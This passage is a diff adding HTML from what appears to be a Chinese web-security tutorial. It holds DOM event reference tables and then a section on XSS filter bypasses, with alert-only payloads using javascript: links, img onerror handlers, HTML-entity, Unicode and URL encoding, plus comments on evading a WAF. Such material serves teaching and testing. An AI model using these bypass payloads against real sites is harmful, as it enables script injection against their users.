+<td>&#x5F53;&#x524D;&#x7684;&#x4E8B;&#x4EF6;&#x4E3A;&#x5192;&#x6CE1;&#x9636;&#x6BB5; (3)</td>
+<td>3</td>
+</tr>
+</tbody>
+</table>
+<h5 id="&#x5C5E;&#x6027;"><a name="&#x5C5E;&#x6027;" class="anchor-navigation-ex-anchor" href="#&#x5C5E;&#x6027;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x5C5E;&#x6027;" class="anchor-navigation-ex-anchor" href="#&#x5C5E;&#x6027;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5C5E;&#x6027;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-bubbles.html" target="_blank">bubbles</a></td>
+<td>&#x8FD4;&#x56DE;&#x5E03;&#x5C14;&#x503C;&#xFF0C;&#x6307;&#x793A;&#x4E8B;&#x4EF6;&#x662F;&#x5426;&#x662F;&#x8D77;&#x6CE1;&#x4E8B;&#x4EF6;&#x7C7B;&#x578B;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-cancelable.html" target="_blank">cancelable</a></td>
+<td>&#x8FD4;&#x56DE;&#x5E03;&#x5C14;&#x503C;&#xFF0C;&#x6307;&#x793A;&#x4E8B;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x62E5;&#x53EF;&#x53D6;&#x6D88;&#x7684;&#x9ED8;&#x8BA4;&#x52A8;&#x4F5C;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-currenttarget.html" target="_blank">currentTarget</a></td>
+<td>&#x8FD4;&#x56DE;&#x5176;&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5668;&#x89E6;&#x53D1;&#x8BE5;&#x4E8B;&#x4EF6;&#x7684;&#x5143;&#x7D20;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td>eventPhase</td>
+<td>&#x8FD4;&#x56DE;&#x4E8B;&#x4EF6;&#x4F20;&#x64AD;&#x7684;&#x5F53;&#x524D;&#x9636;&#x6BB5;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-target.html" target="_blank">target</a></td>
+<td>&#x8FD4;&#x56DE;&#x89E6;&#x53D1;&#x6B64;&#x4E8B;&#x4EF6;&#x7684;&#x5143;&#x7D20;&#xFF08;&#x4E8B;&#x4EF6;&#x7684;&#x76EE;&#x6807;&#x8282;&#x70B9;&#xFF09;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-timestamp.html" target="_blank">timeStamp</a></td>
+<td>&#x8FD4;&#x56DE;&#x4E8B;&#x4EF6;&#x751F;&#x6210;&#x7684;&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-type.html" target="_blank">type</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D; Event &#x5BF9;&#x8C61;&#x8868;&#x793A;&#x7684;&#x4E8B;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x3002;</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h5 id="&#x65B9;&#x6CD5;"><a name="&#x65B9;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x65B9;&#x6CD5;" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65B9;&#x6CD5;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x65B9;&#x6CD5;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>initEvent()</td>
+<td>&#x521D;&#x59CB;&#x5316;&#x65B0;&#x521B;&#x5EFA;&#x7684; Event &#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td>preventDefault()</td>
+<td>&#x901A;&#x77E5;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x8981;&#x6267;&#x884C;&#x4E0E;&#x4E8B;&#x4EF6;&#x5173;&#x8054;&#x7684;&#x9ED8;&#x8BA4;&#x52A8;&#x4F5C;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td>stopPropagation()</td>
+<td>&#x4E0D;&#x518D;&#x6D3E;&#x53D1;&#x4E8B;&#x4EF6;&#x3002;</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><a name="&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</h4>
+<h5 id="&#x65B9;&#x6CD5;_1"><a name="&#x65B9;&#x6CD5;_1" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_1"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x65B9;&#x6CD5;_1" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_1"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65B9;&#x6CD5;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x65B9;&#x6CD5;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>addEventListener()</td>
+<td>&#x5141;&#x8BB8;&#x5728;&#x76EE;&#x6807;&#x4E8B;&#x4EF6;&#x4E2D;&#x6CE8;&#x518C;&#x76D1;&#x542C;&#x4E8B;&#x4EF6;(IE8 = attachEvent())</td>
+<td>2</td>
+</tr>
+<tr>
+<td>dispatchEvent()</td>
+<td>&#x5141;&#x8BB8;&#x53D1;&#x9001;&#x4E8B;&#x4EF6;&#x5230;&#x76D1;&#x542C;&#x5668;&#x4E0A; (IE8 = fireEvent())</td>
+<td>2</td>
+</tr>
+<tr>
+<td>removeEventListener()</td>
+<td>&#x8FD0;&#x884C;&#x4E00;&#x6B21;&#x6CE8;&#x518C;&#x5728;&#x4E8B;&#x4EF6;&#x76EE;&#x6807;&#x4E0A;&#x7684;&#x76D1;&#x542C;&#x4E8B;&#x4EF6;(IE8 = detachEvent())</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;"><a name="&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x5BF9;&#x8C61;</h4>
+<h5 id="&#x65B9;&#x6CD5;_2"><a name="&#x65B9;&#x6CD5;_2" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_2"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x65B9;&#x6CD5;_2" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_2"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65B9;&#x6CD5;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x65B9;&#x6CD5;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>handleEvent()</td>
+<td>&#x628A;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x6CE8;&#x518C;&#x4E3A;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x7A0B;&#x5E8F;</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><a name="&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x6587;&#x6863;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</h4>
+<h5 id="&#x65B9;&#x6CD5;_3"><a name="&#x65B9;&#x6CD5;_3" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_3"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x65B9;&#x6CD5;_3" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_3"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65B9;&#x6CD5;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x65B9;&#x6CD5;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>createEvent()</td>
+<td></td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x9F20;&#x6807;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><a name="&#x9F20;&#x6807;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x9F20;&#x6807;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9F20;&#x6807;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;" class="anchor-navigation-ex-anchor" href="#&#x9F20;&#x6807;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9F20;&#x6807;/&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;</h4>
+<h5 id="&#x5C5E;&#x6027;_1"><a name="&#x5C5E;&#x6027;_1" class="anchor-navigation-ex-anchor" href="#&#x5C5E;&#x6027;_1"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x5C5E;&#x6027;_1" class="anchor-navigation-ex-anchor" href="#&#x5C5E;&#x6027;_1"><i class="fa fa-link" aria-hidden="true"></i></a>&#x5C5E;&#x6027;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-altkey.html" target="_blank">altKey</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&quot;ALT&quot; &#x662F;&#x5426;&#x88AB;&#x6309;&#x4E0B;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-button.html" target="_blank">button</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&#x54EA;&#x4E2A;&#x9F20;&#x6807;&#x6309;&#x94AE;&#x88AB;&#x70B9;&#x51FB;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-clientx.html" target="_blank">clientX</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&#x9F20;&#x6807;&#x6307;&#x9488;&#x7684;&#x6C34;&#x5E73;&#x5750;&#x6807;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-clienty.html" target="_blank">clientY</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&#x9F20;&#x6807;&#x6307;&#x9488;&#x7684;&#x5782;&#x76F4;&#x5750;&#x6807;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ctrlkey.html" target="_blank">ctrlKey</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&quot;CTRL&quot; &#x952E;&#x662F;&#x5426;&#x88AB;&#x6309;&#x4E0B;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-key-location.html" target="_blank">Location</a></td>
+<td>&#x8FD4;&#x56DE;&#x6309;&#x952E;&#x5728;&#x8BBE;&#x5907;&#x4E0A;&#x7684;&#x4F4D;&#x7F6E;</td>
+<td>3</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-key-charcode.html" target="_blank">charCode</a></td>
+<td>&#x8FD4;&#x56DE;onkeypress&#x4E8B;&#x4EF6;&#x89E6;&#x53D1;&#x952E;&#x503C;&#x7684;&#x5B57;&#x6BCD;&#x4EE3;&#x7801;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-key-key.html" target="_blank">key</a></td>
+<td>&#x5728;&#x6309;&#x4E0B;&#x6309;&#x952E;&#x65F6;&#x8FD4;&#x56DE;&#x6309;&#x952E;&#x7684;&#x6807;&#x8BC6;&#x7B26;&#x3002;</td>
+<td>3</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-key-keycode.html" target="_blank">keyCode</a></td>
+<td>&#x8FD4;&#x56DE;onkeypress&#x4E8B;&#x4EF6;&#x89E6;&#x53D1;&#x7684;&#x952E;&#x7684;&#x503C;&#x7684;&#x5B57;&#x7B26;&#x4EE3;&#x7801;&#xFF0C;&#x6216;&#x8005; onkeydown &#x6216; onkeyup &#x4E8B;&#x4EF6;&#x7684;&#x952E;&#x7684;&#x4EE3;&#x7801;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-key-which.html" target="_blank">which</a></td>
+<td>&#x8FD4;&#x56DE;onkeypress&#x4E8B;&#x4EF6;&#x89E6;&#x53D1;&#x7684;&#x952E;&#x7684;&#x503C;&#x7684;&#x5B57;&#x7B26;&#x4EE3;&#x7801;&#xFF0C;&#x6216;&#x8005; onkeydown &#x6216; onkeyup &#x4E8B;&#x4EF6;&#x7684;&#x952E;&#x7684;&#x4EE3;&#x7801;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-metakey.html" target="_blank">metaKey</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&quot;meta&quot; &#x952E;&#x662F;&#x5426;&#x88AB;&#x6309;&#x4E0B;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-relatedtarget.html" target="_blank">relatedTarget</a></td>
+<td>&#x8FD4;&#x56DE;&#x4E0E;&#x4E8B;&#x4EF6;&#x7684;&#x76EE;&#x6807;&#x8282;&#x70B9;&#x76F8;&#x5173;&#x7684;&#x8282;&#x70B9;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-screenx.html" target="_blank">screenX</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x67D0;&#x4E2A;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&#x9F20;&#x6807;&#x6307;&#x9488;&#x7684;&#x6C34;&#x5E73;&#x5750;&#x6807;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-screeny.html" target="_blank">screenY</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x67D0;&#x4E2A;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&#x9F20;&#x6807;&#x6307;&#x9488;&#x7684;&#x5782;&#x76F4;&#x5750;&#x6807;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-shiftkey.html" target="_blank">shiftKey</a></td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&quot;SHIFT&quot; &#x952E;&#x662F;&#x5426;&#x88AB;&#x6309;&#x4E0B;&#x3002;</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h5 id="&#x65B9;&#x6CD5;_4"><a name="&#x65B9;&#x6CD5;_4" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_4"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x65B9;&#x6CD5;_4" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6CD5;_4"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65B9;&#x6CD5;</h5>
+<table>
+<thead>
+<tr>
+<th>&#x65B9;&#x6CD5;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>W3C</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>initMouseEvent()</td>
+<td>&#x521D;&#x59CB;&#x5316;&#x9F20;&#x6807;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;&#x7684;&#x503C;</td>
+<td>2</td>
+</tr>
+<tr>
+<td>initKeyboardEvent()</td>
+<td>&#x521D;&#x59CB;&#x5316;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;&#x7684;&#x503C;</td>
+</tr>
+</tbody>
+</table>
+<h2 id="xss&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;"><a name="xss&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;" class="anchor-navigation-ex-anchor" href="#xss&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6. XSS&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;</h2>
+<h3 id="javascript&#x4F2A;&#x534F;&#x8BAE;"><a name="javascript&#x4F2A;&#x534F;&#x8BAE;" class="anchor-navigation-ex-anchor" href="#javascript&#x4F2A;&#x534F;&#x8BAE;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.1. JavaScript&#x4F2A;&#x534F;&#x8BAE;</h3>
+<pre class="language-"><code class="lang-html">javascript:alert(/xss/);
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>javascript:alert(1)</span><span class="token punctuation">&gt;</span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--&#x5F15;&#x53F7;&#x53EF;&#x4EE5;&#x53BB;&#x6389;--&gt;</span>
+<span class="token comment">&lt;!--&#x652F;&#x6301;&#x4F2A;&#x534F;&#x8BAE;&#x7684;&#x5C5E;&#x6027;&#x6709;&#xFF1A;href&#xFF0C;lowsrc&#xFF0C;bgsound&#xFF0C;background&#xFF0C;action&#xFF0C;dynsrc--&gt;</span>
+<span class="token comment">&lt;!-- &#x597D;&#x591A;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x4E0D;&#x652F;&#x6301;&#x4E86;&#xFF0C;a&#x6807;&#x7B7E;&#x8FD8;&#x652F;&#x6301;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x8981;&#x70B9;&#x51FB;&#x624D;&#x80FD;&#x751F;&#x6548;--&gt;</span>
+</code></pre>
+<h3 id="&#x7F16;&#x7801;"><a name="&#x7F16;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x7F16;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.2. &#x7F16;&#x7801;</h3>
+<p>&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x89E3;&#x6790;HTML&#x6587;&#x6863;&#x65F6;&#x65E0;&#x8BBA;&#x6309;&#x7167;&#x4EC0;&#x4E48;&#x987A;&#x5E8F;&#xFF0C;&#x4E3B;&#x8981;&#x6709;&#x4E09;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF1A;HTML&#x89E3;&#x6790;&#x3001;JS&#x89E3;&#x6790;&#x548C;URL&#x89E3;&#x6790;&#xFF0C;&#x6BCF;&#x4E2A;&#x89E3;&#x6790;&#x5668;&#x8D1F;&#x8D23;HTML&#x6587;&#x6863;&#x4E2D;&#x5404;&#x81EA;&#x5BF9;&#x5E94;&#x90E8;&#x5206;&#x7684;&#x89E3;&#x6790;&#x5DE5;&#x4F5C;&#x3002;
+&#x9996;&#x5148;&#x6D4F;&#x89C8;&#x5668;&#x63A5;&#x6536;&#x5230;&#x4E00;&#x4E2A;HTML&#x6587;&#x6863;&#x65F6;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;HTML&#x89E3;&#x6790;&#x5668;&#x5BF9;HTML&#x6587;&#x6863;&#x8FDB;&#x884C;&#x8BCD;&#x6CD5;&#x89E3;&#x6790;&#xFF0C;&#x8FD9;&#x4E00;&#x8FC7;&#x7A0B;&#x5B8C;&#x6210;HTML&#x89E3;&#x7801;&#x5E76;&#x521B;&#x5EFA;DOM&#x6811;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;JavaScript&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x3002;&#x4ECB;&#x5165;&#x5BF9;&#x5185;&#x8054;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#xFF0C;&#x8FD9;&#x4E00;&#x8FC7;&#x7A0B;&#x5B8C;&#x6210;JS&#x7684;&#x89E3;&#x7801;&#x5DE5;&#x4F5C;&#xFF0C;&#x5982;&#x679C;&#x6D4F;&#x89C8;&#x5668;&#x9047;&#x5230;&#x9700;&#x8981;URL&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x73AF;&#x5883;&#xFF0C;&#x8FD9;&#x65F6;URL&#x89E3;&#x6790;&#x5668;&#x4E5F;&#x4F1A;&#x4ECB;&#x5165;&#x5B8C;&#x6210;URL&#x7684;&#x89E3;&#x7801;&#x5DE5;&#x4F5C;&#xFF0C;URL&#x89E3;&#x6790;&#x5668;&#x7684;&#x89E3;&#x7801;&#x987A;&#x5E8F;&#x4F1A;&#x6839;&#x636E;URL&#x6240;&#x5728;&#x4F4D;&#x7F6E;&#x4E0D;&#x540C;&#xFF0C;&#x53EF;&#x80FD;&#x5728;JavaScript&#x89E3;&#x6790;&#x5668;&#x4E4B;&#x524D;&#x6216;&#x4E4B;&#x540E;&#x89E3;&#x6790;&#x3002;
+&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x89E3;&#x6790;&#x89C4;&#x5219;&#xFF1A;&#x6D4F;&#x89C8;&#x5668;&#x6536;&#x5230;HTML&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x4F1A;&#x4ECE;&#x5934;&#x5F00;&#x59CB;&#x89E3;&#x6790;&#x3002;&#x5F53;&#x9047;&#x5230;JS&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;JS&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x3002;&#x5F53;&#x9047;&#x5230;URL&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;URL&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x3002;&#x9047;&#x5230;CSS&#x5219;&#x7528;CSS&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x3002;&#x5C24;&#x5176;&#x5F53;&#x9047;&#x5230;&#x590D;&#x6742;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x8BE5;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x7ECF;&#x8FC7;&#x591A;&#x4E2A;&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x3002;</p>
+<pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>alert&amp;#x28/xss/&amp;#x29<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>alert&amp;#x000000000028/xss/&amp;#x29<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token comment">&lt;!--&#x9996;&#x5148;&#x7ECF;&#x8FC7;HTML&#x89E3;&#x6790;&#x5C06;alert&amp;#x28/xss/&amp;#x29&quot;&#x89E3;&#x6790;&#x4E3A;alert(1)&#xFF0C;&#x7136;&#x540E;JS&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x540E;&#x6267;&#x884C;alert(1)&#xFF0C;&#x5BFC;&#x81F4;&#x5F39;&#x7A97;&#x3002;
+&#x7136;&#x540E;&#x7B2C;&#x4E8C;&#x4E2A;payload&#x4E2D;&amp;#x000000000028&#x4E0D;&#x7BA1;&#x6709;&#x591A;&#x5C11;&#x4E2A;0&#xFF0C;HTML&#x89E3;&#x6790;&#x5668;&#x90FD;&#x4F1A;&#x6B63;&#x5E38;&#x89E3;&#x6790;&#xFF0C;&#x7ED5;WAF&#x7684;&#x65F6;&#x5019;&#x975E;&#x5E38;&#x6709;&#x7528;--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>\u0061lert(/xss/)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token comment">&lt;!--&#x9996;&#x5148;&#x7ECF;&#x8FC7;HTML&#x89E3;&#x6790;&#xFF0C;&#x7136;&#x540E;JS&#x89E3;&#x6790;&#x5668;&#x6210;&#x529F;&#x5C06;\u0061lert(/xss/)&#x89E3;&#x6790;&#x4E3A;alert(/xss/)&#x6240;&#x4EE5;&#x80FD;&#x5F39;&#x7A97; 
+&#x4F46;&#x662F;&#x7528; Unicode &#x8F6C;&#x4E49;&#x5E8F;&#x5217;&#x6765;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x63A7;&#x5236;&#x5B57;&#x7B26;&#x65F6;&#xFF0C;&#x4F8B;&#x5982;&#x5355;&#x5F15;&#x53F7;&#x3001;&#x53CC;&#x5F15;&#x53F7;&#x3001;&#x5706;&#x62EC;&#x53F7;&#x7B49;&#x7B49;&#xFF0C;
+&#x5B83;&#x4EEC;&#x5C06;&#x4E0D;&#x4F1A;&#x88AB;&#x89E3;&#x91CA;&#x6210;&#x63A7;&#x5236;&#x5B57;&#x7B26;&#xFF0C;&#x800C;&#x4EC5;&#x4EC5;&#x88AB;&#x89E3;&#x7801;&#x5E76;&#x89E3;&#x6790;&#x4E3A;&#x6807;&#x8BC6;&#x7B26;&#x540D;&#x79F0;&#x6216;&#x8005;&#x5B57;&#x7B26;&#x4E32;&#x5E38;&#x91CF;--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript:%61lert%281%29<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>xss<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
